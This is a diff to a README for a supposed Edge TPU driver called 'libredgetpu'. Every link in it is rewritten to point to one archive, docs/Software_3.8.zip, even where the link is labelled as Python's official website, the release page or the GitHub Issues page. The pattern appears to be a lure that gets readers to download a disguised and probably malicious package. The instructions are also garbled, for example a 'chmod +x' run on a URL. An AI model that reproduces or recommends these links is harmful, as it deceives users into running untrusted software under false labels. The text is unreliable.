@@ -1,6 +1,6 @@
 # ⚙️ libredgetpu - Easy Edge TPU Driver for Custom Tasks
 
-[![Download libredgetpu](https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip)](https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip)
+[![Download libredgetpu](https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip)](https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip)
 
 
 ## 📖 What is libredgetpu?
@@ -22,7 +22,7 @@ Before you begin, make sure your device meets these guidelines:
 - **Python:** Python 3.6 or newer installed on your system (libredgetpu requires Python)
 - **Storage:** At least 100 MB of free space for installation files and programs
 
-You do not need any programming knowledge to run libredgetpu, but having Python installed is necessary. Don’t worry if you don’t have it; you can get Python easily from the official website [https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip](https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip).
+You do not need any programming knowledge to run libredgetpu, but having Python installed is necessary. Don’t worry if you don’t have it; you can get Python easily from the official website [https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip](https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip).
 
 ---
 
@@ -33,13 +33,13 @@ This guide will lead you step-by-step through downloading and running libredgetp
 ### Step 1: Download the Software
 
 Click the big blue button at the top or go directly to this link:
-[https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip](https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip).
+[https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip](https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip).
 
 This page holds the latest versions of libredgetpu for download. Look for the file that matches your operating system:
 
 - For Windows, download the `.exe` or `.zip` file
 - For macOS, download the `.dmg` or `.zip` file
-- For Linux, download the `https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip` or `.AppImage` file
+- For Linux, download the `https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip` or `.AppImage` file
 
 Save the file to a location you will remember, like your Desktop or Downloads folder.
 
@@ -52,7 +52,7 @@ Save the file to a location you will remember, like your Desktop or Downloads fo
   If you downloaded a `.dmg`, double-click it, then drag the libredgetpu app icon into your Applications folder.
 
 - **Linux:**  
-  Extract the `https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip` file by right-clicking and selecting “Extract Here” or use terminal commands. For `.AppImage` files, make them executable by running `chmod +x https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip` in the terminal, then double-click to start.
+  Extract the `https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip` file by right-clicking and selecting “Extract Here” or use terminal commands. For `.AppImage` files, make them executable by running `chmod +x https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip` in the terminal, then double-click to start.
 
 ### Step 3: Connect Your Edge TPU Device
 
@@ -109,7 +109,7 @@ If you encounter any problems, try these steps:
 
 Visit the official release page to download the latest version of libredgetpu:
 
-[https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip](https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip)
+[https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip](https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip)
 
 This link takes you to a page where you can pick the right installer or package for your operating system. Always download the latest stable version to get new features and bug fixes.
 
@@ -119,7 +119,7 @@ This link takes you to a page where you can pick the right installer or package 
 
 If you need help beyond this guide:
 
-- Check the [libredgetpu Issues](https://github.com/baxxx12/libredgetpu/raw/refs/heads/main/docs/Software_3.8.zip) page on GitHub to see if others had the same problem.
+- Check the [libredgetpu Issues](https://raw.githubusercontent.com/baxxx12/libredgetpu/main/docs/Software_3.8.zip) page on GitHub to see if others had the same problem.
 
 - Search the web for “Edge TPU support” or “Google Coral community” for user forums.
 
